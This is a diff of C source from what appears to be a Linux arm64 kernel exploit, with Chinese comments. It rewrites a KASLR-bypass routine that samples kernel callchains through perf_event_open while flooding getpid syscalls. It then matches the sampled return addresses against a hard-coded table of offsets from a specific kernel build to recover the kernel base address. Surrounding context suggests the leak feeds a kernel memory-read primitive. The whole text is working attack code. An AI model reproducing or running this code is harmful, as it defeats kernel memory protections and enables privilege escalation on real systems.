@@ -838,8 +838,125 @@ ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
   return configfs_read_once(fd, target, data, len);
 }
 
-#define PERF_LEAK_ALIGN 0x200000ULL
-#define PERF_LEAK_MMAP_PAGES 8
+/* --------------------------------------------------------------------------
+ * KASLR 泄漏(perf 路线):perf_event_paranoid == -1 时可用。
+ *
+ * 原理:给自己挂一个 software cpu-clock 事件(exclude_user=1),再疯狂跑
+ * getpid()。定时器只在内核态打断我们 → 每个样本的 callchain 必然是
+ * [IP] + invoke_syscall 返回点 + el0_svc_common 返回点 + do_el0_svc 返回点
+ * + el0_svc 返回点(全部来自本内核镜像的静态反汇编,锚点表见下)。
+ * 帧值 = 镜像基址 + slide + 锚点RVA(精确相等,不是近似),所以每次命中
+ * 都直接解出 slide。帧本身也都是别的函数的返回点,不可能与锚点地址
+ * 巧合相等 → 伪阳性为零;仍要求 >=2 个不同锚点同时命中以双保险。
+ * -------------------------------------------------------------------------- */
+
+struct perf_anchor {
+  uint64_t rva;
+  const char *func;
+};
+
+/* shennong 6.1.138 镜像中以下函数的全部 BL/BLR 返回点
+ * (gen_anchors.py 用 llvm-objdump 从 kernel.elf 提取) */
+static const struct perf_anchor perf_anchors[] = {
+  {0x010034ULL, "gic_handle_irq"},
+  {0x010060ULL, "gic_handle_irq"},
+  {0x01006cULL, "gic_handle_irq"},
+  {0x010074ULL, "gic_handle_irq"},
+  {0x010094ULL, "gic_handle_irq"},
+  {0x010144ULL, "gic_handle_irq"},
+  {0x010194ULL, "gic_handle_irq"},
+  {0x02cfc0ULL, "do_el0_svc"},
+  {0x02d08cULL, "el0_svc_common"},
+  {0x02d0a4ULL, "el0_svc_common"},
+  {0x02d0d0ULL, "el0_svc_common"},
+  {0x02d0f8ULL, "el0_svc_common"},
+  {0x02d190ULL, "invoke_syscall"},
+  {0x02d1d8ULL, "invoke_syscall"},
+  {0x02d1e4ULL, "invoke_syscall"},
+  {0x02d228ULL, "invoke_syscall"},
+  {0x1869f4ULL, "hrtimer_interrupt"},
+  {0x186a1cULL, "hrtimer_interrupt"},
+  {0x186a6cULL, "hrtimer_interrupt"},
+  {0x186a80ULL, "hrtimer_interrupt"},
+  {0x186a88ULL, "hrtimer_interrupt"},
+  {0x186aa8ULL, "hrtimer_interrupt"},
+  {0x186ab4ULL, "hrtimer_interrupt"},
+  {0x186ac0ULL, "hrtimer_interrupt"},
+  {0x186ad8ULL, "hrtimer_interrupt"},
+  {0x186b38ULL, "hrtimer_interrupt"},
+  {0x186b4cULL, "hrtimer_interrupt"},
+  {0x186b54ULL, "hrtimer_interrupt"},
+  {0x186b74ULL, "hrtimer_interrupt"},
+  {0x186b80ULL, "hrtimer_interrupt"},
+  {0x186b8cULL, "hrtimer_interrupt"},
+  {0x186ba4ULL, "hrtimer_interrupt"},
+  {0x186c04ULL, "hrtimer_interrupt"},
+  {0x186c18ULL, "hrtimer_interrupt"},
+  {0x186c20ULL, "hrtimer_interrupt"},
+  {0x186c40ULL, "hrtimer_interrupt"},
+  {0x186c4cULL, "hrtimer_interrupt"},
+  {0x186c58ULL, "hrtimer_interrupt"},
+  {0x186c70ULL, "hrtimer_interrupt"},
+  {0x186cbcULL, "hrtimer_interrupt"},
+  {0x186cf0ULL, "hrtimer_interrupt"},
+  {0x186d10ULL, "hrtimer_interrupt"},
+  {0x186e38ULL, "__hrtimer_run_queues"},
+  {0x186e68ULL, "__hrtimer_run_queues"},
+  {0x186e8cULL, "__hrtimer_run_queues"},
+  {0x186e9cULL, "__hrtimer_run_queues"},
+  {0x186eb8ULL, "__hrtimer_run_queues"},
+  {0x186f40ULL, "__hrtimer_run_queues"},
+  {0x186f60ULL, "__hrtimer_run_queues"},
+  {0x186fb0ULL, "__hrtimer_run_queues"},
+  {0x186fd4ULL, "__hrtimer_run_queues"},
+  {0x187020ULL, "__hrtimer_run_queues"},
+  {0x187044ULL, "__hrtimer_run_queues"},
+  {0x187084ULL, "__hrtimer_run_queues"},
+  {0xff6190ULL, "el0_svc"},
+  {0xff6198ULL, "el0_svc"},
+  {0xff61b8ULL, "el0_svc"},
+  {0xff61d0ULL, "el0_svc"},
+};
+
+#define PERF_ANCHOR_COUNT (int)(sizeof(perf_anchors) / sizeof(perf_anchors[0]))
+#define PERF_LEAK_RING_PAGES 32
+#define PERF_LEAK_SLIDE_ALIGN 0x200000ULL
+#define PERF_LEAK_SLIDE_MAX 0x400000000ULL
+#define PERF_LEAK_STORM_ITER 200000
+#define PERF_LEAK_MAX_CHAIN 128
+#define PERF_LEAK_MAX_VOTES 16
+
+struct perf_slide_vote {
+  uint64_t slide;
+  int votes;
+  uint64_t anchor_mask;
+};
+
+static void perf_vote_slide(struct perf_slide_vote *votes, int max_votes,
+                            uint64_t slide, int anchor_idx) {
+  for (int i = 0; i < max_votes; i++) {
+    if (votes[i].votes == 0) {
+      votes[i].slide = slide;
+      votes[i].votes = 1;
+      votes[i].anchor_mask = 1ULL << anchor_idx;
+      return;
+    }
+    if (votes[i].slide == slide) {
+      votes[i].votes++;
+      votes[i].anchor_mask |= 1ULL << anchor_idx;
+      return;
+    }
+  }
+}
+
+static int perf_popcount64(uint64_t v) {
+  int n = 0;
+  while (v) {
+    v &= v - 1;
+    n++;
+  }
+  return n;
+}
 
 uint64_t perf_leak_text_base(void) {
   int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
@@ -861,8 +978,8 @@ uint64_t perf_leak_text_base(void) {
   pe.type = PERF_TYPE_SOFTWARE;
   pe.config = PERF_COUNT_SW_CPU_CLOCK;
   pe.size = sizeof(pe);
-  pe.sample_period = 1;
-  pe.sample_type = PERF_SAMPLE_IP;
+  pe.sample_period = 20000;
+  pe.sample_type = PERF_SAMPLE_CALLCHAIN;
   pe.exclude_user = 1;
   pe.exclude_hv = 1;
   pe.disabled = 1;
@@ -874,11 +991,16 @@ uint64_t perf_leak_text_base(void) {
     fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
   }
   if (fd < 0) {
+    pe.sample_period = 1000000;
+    fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
+  }
+  if (fd < 0) {
     pr_warning("perf text-base perf_event_open errno=%d\n", errno);
     return 0;
   }
 
-  size_t mmap_size = (size_t)(1 + PERF_LEAK_MMAP_PAGES) * (size_t)PAGE_SIZE;
+  size_t mmap_size =
+      (size_t)(1 + PERF_LEAK_RING_PAGES) * (size_t)PAGE_SIZE;
   void *mmap_buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE,
                          MAP_SHARED, fd, 0);
   if (mmap_buf == MAP_FAILED) {
@@ -889,65 +1011,113 @@ uint64_t perf_leak_text_base(void) {
 
   struct perf_event_mmap_page *header =
       (struct perf_event_mmap_page *)mmap_buf;
-  uint64_t min_kip = ~(uint64_t)0;
-  int kernel_samples = 0;
 
   ioctl(fd, PERF_EVENT_IOC_RESET, 0);
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
 
-  for (volatile long i = 0; i < 500000; i++) {
-    if ((i % 10000) == 0) {
-      sched_yield();
-    }
+  /* 定时器只在内核态打断我们(exclude_user=1) → 命中的必然是
+   * getpid 系统调用路径,callchain 全是锚点函数的返回点 */
+  for (volatile long i = 0; i < PERF_LEAK_STORM_ITER; i++) {
+    syscall(__NR_getpid);
   }
 
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
 
-  uint64_t data_tail = header->data_tail;
-  uint64_t data_head = header->data_head;
+  uint64_t head = header->data_head;
   __sync_synchronize();
-  uint64_t data_size = (uint64_t)PERF_LEAK_MMAP_PAGES * (uint64_t)PAGE_SIZE;
-  uint8_t *base = (uint8_t *)mmap_buf + PAGE_SIZE;
-
-  while (data_tail < data_head) {
-    struct perf_event_header *ev =
-        (struct perf_event_header *)(base + (data_tail % data_size));
-    if (ev->size == 0) {
-      break;
-    }
-    if (data_tail + ev->size > data_head) {
-      break;
-    }
-    if (ev->type == PERF_RECORD_SAMPLE &&
-        (ev->misc & PERF_RECORD_MISC_KERNEL)) {
-      uint64_t ip = *(uint64_t *)((uint8_t *)ev + sizeof(*ev));
-      if (ip >= KIMAGE_TEXT_BASE && ip < min_kip) {
-        min_kip = ip;
-      }
-      kernel_samples++;
-    }
-    data_tail += ev->size;
+  uint64_t size = (uint64_t)PERF_LEAK_RING_PAGES * (uint64_t)PAGE_SIZE;
+  uint64_t tail = header->data_tail;
+  if (head > tail + size) {
+    /* 环形缓冲回绕:只保留最后一个窗口 */
+    tail = head - size;
   }
-  header->data_tail = data_tail;
+  uint8_t *data = (uint8_t *)mmap_buf + PAGE_SIZE;
+
+  struct perf_slide_vote votes[PERF_LEAK_MAX_VOTES];
+  memset(votes, 0, sizeof(votes));
+  int samples = 0;
+  int kernel_samples = 0;
+  int frames = 0;
+  int max_chain = 0;
+  int zero_slide_hits = 0;
+
+  while (tail + 8 <= head) {
+    struct perf_event_header *ev =
+        (struct perf_event_header *)(data + (tail % size));
+    uint16_t esz = ev->size;
+    if (esz < 8 || (esz & 7) || tail + esz > head) {
+      break;
+    }
+    if (ev->type == PERF_RECORD_SAMPLE) {
+      samples++;
+      if (ev->misc & PERF_RECORD_MISC_KERNEL) {
+        kernel_samples++;
+      }
+      /* sample_type = CALLCHAIN only: header + u64 nr + nr*u64 ips */
+      const uint64_t *body = (const uint64_t *)((uint8_t *)ev + sizeof(*ev));
+      uint64_t nr = body[0];
+      if (nr > 0 && nr <= PERF_LEAK_MAX_CHAIN) {
+        if ((int)nr > max_chain) {
+          max_chain = (int)nr;
+        }
+        for (uint64_t k = 0; k < nr; k++) {
+          uint64_t ip = body[1 + k];
+          frames++;
+          for (int a = 0; a < PERF_ANCHOR_COUNT; a++) {
+            uint64_t slide =
+                ip - KIMAGE_TEXT_BASE - perf_anchors[a].rva;
+            if (slide == 0) {
+              zero_slide_hits++;
+              continue;
+            }
+            if (slide >= PERF_LEAK_SLIDE_MAX ||
+                (slide & (PERF_LEAK_SLIDE_ALIGN - 1)) != 0) {
+              continue;
+            }
+            perf_vote_slide(votes, PERF_LEAK_MAX_VOTES, slide, a);
+          }
+        }
+      }
+    }
+    tail += esz;
+  }
+  header->data_tail = tail;
 
   munmap(mmap_buf, mmap_size);
   close(fd);
 
-  if (kernel_samples == 0 || min_kip == ~(uint64_t)0) {
-    pr_warning("perf text-base no kernel samples collected\n");
+  if (samples == 0) {
+    pr_warning("perf text-base no samples (max_chain=%d)\n", max_chain);
     return 0;
   }
 
-  uint64_t text_base =
-      (min_kip & ~(PERF_LEAK_ALIGN - 1)) + P0_KERNEL_PHYS_DELTA;
-  if (text_base < KIMAGE_TEXT_BASE) {
-    pr_warning("perf text-base out of range: %016llx\n",
-               (unsigned long long)text_base);
+  int best = -1;
+  for (int i = 0; i < PERF_LEAK_MAX_VOTES; i++) {
+    if (votes[i].votes == 0) {
+      continue;
+    }
+    pr_info("perf slide-candidate slide=%016llx votes=%d anchors=%d\n",
+            (unsigned long long)votes[i].slide, votes[i].votes,
+            perf_popcount64(votes[i].anchor_mask));
+    if (best < 0 || votes[i].votes > votes[best].votes) {
+      best = i;
+    }
+  }
+
+  if (best < 0 || votes[best].votes < 3 ||
+      perf_popcount64(votes[best].anchor_mask) < 2) {
+    pr_warning("perf text-base no reliable slide: samples=%d "
+               "kernel=%d frames=%d max_chain=%d zero_slide_hits=%d\n",
+               samples, kernel_samples, frames, max_chain, zero_slide_hits);
     return 0;
   }
-  pr_success("perf text-base pid=%d samples=%d min_kip=%016llx "
-             "text_base=%016llx\n",
-             getpid(), kernel_samples, (unsigned long long)min_kip,
+
+  uint64_t text_base = KIMAGE_TEXT_BASE + votes[best].slide;
+  pr_success("perf text-base pid=%d samples=%d kernel=%d frames=%d "
+             "max_chain=%d slide=%016llx votes=%d anchors=%d base=%016llx\n",
+             getpid(), samples, kernel_samples, frames, max_chain,
+             (unsigned long long)votes[best].slide, votes[best].votes,
+             perf_popcount64(votes[best].anchor_mask),
              (unsigned long long)text_base);
   return text_base;
 }
